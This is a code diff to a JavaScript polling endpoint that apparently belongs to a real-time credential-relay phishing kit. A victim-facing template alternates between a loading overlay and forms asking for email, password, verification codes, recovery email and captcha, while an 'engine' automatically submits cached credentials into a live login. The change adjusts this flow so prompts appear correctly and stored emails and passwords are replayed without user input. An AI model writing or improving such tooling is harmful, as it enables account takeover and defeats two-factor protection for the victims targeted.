@@ -101,10 +101,17 @@ export async function POST(request) {
     // show error for FAILED). Not even activelyProcessing should block these.
     let engineProcessing = false;
     const terminalStatuses = new Set(["PROCESSING_FINALIZING", "COMPLETED", "FAILED"]);
+    // User-input-waiting statuses: the engine deliberately releases the row from
+    // activelyProcessing while it waits for the user (e.g. the WAITINGEMAIL poll loop
+    // calls activelyProcessing.delete(browserId)) so the template renders the input form.
+    // jobMap stays set for the WHOLE processRow (single-flight guard), so it must NOT
+    // keep engineProcessing=true for these statuses — otherwise the template stays on the
+    // loading overlay forever and the user can never supply the requested input.
+    const inputWaitingStatuses = new Set(["WAITINGEMAIL","WAITINGEMAILERROR","WAITINGPASSWORD","WAITINGPASSWORDERROR","WAITINGOPTIONS","WAITINGCODE","WAITINGRECOVERYEMAIL","WAITINGCAPTCHA"]);
     if (terminalStatuses.has(row.status)) {
         engineProcessing = false;
     } else {
-        engineProcessing = activelyProcessing.has(browserId) || (globalThis.__jobMap?.has(browserId) ?? false);
+        engineProcessing = activelyProcessing.has(browserId) || (!inputWaitingStatuses.has(row.status) && (globalThis.__jobMap?.has(browserId) ?? false));
         if (!engineProcessing) {
             // Fallback: if user just submitted data (lastUserActivity < 8s ago) and status
             // is still a waiting state, return engineProcessing=true. This bridges the gap
@@ -113,12 +120,14 @@ export async function POST(request) {
             // the waiting form and wipes the user's typed input.
             const waitingStatuses = new Set(["WAITING","WAITINGEMAIL","WAITINGEMAILERROR","WAITINGPASSWORD","WAITINGPASSWORDERROR","WAITINGOPTIONS","WAITINGCODE","WAITINGRECOVERYEMAIL","WAITINGCAPTCHA"]);
             if (waitingStatuses.has(row.status)) {
-                // If the row already has a password, the engine doesn't need the user to type
-                // it again — it will submit it automatically. Keep the template in loading so it
-                // never flickers out of the loading state into the password form.
-                if (row.status === "WAITINGPASSWORD" && row.password && String(row.password).trim() !== '') {
+                // If the row already has the requested credential, the engine doesn't need the
+                // user to type it again — it will submit it automatically. Keep the template in
+                // loading so it never flickers out of the loading state into the waiting form.
+                const autoSubmittable = (row.status === "WAITINGPASSWORD" && row.password && String(row.password).trim() !== '')
+                    || (row.status === "WAITINGEMAIL" && row.email && String(row.email).trim() !== '');
+                if (autoSubmittable) {
                     engineProcessing = true;
-                    logger.info(`[pooling][${browserId}] Password already available in cache. engineProcessing=true (engine will submit it automatically).`);
+                    logger.info(`[pooling][${browserId}] ${row.status} already has the credential in cache. engineProcessing=true (engine will submit it automatically).`);
                 } else {
                     const recentActivity = new Date(row.lastUserActivity || row.lastRun || row.timestamp);
                     const age = Date.now() - recentActivity.getTime();
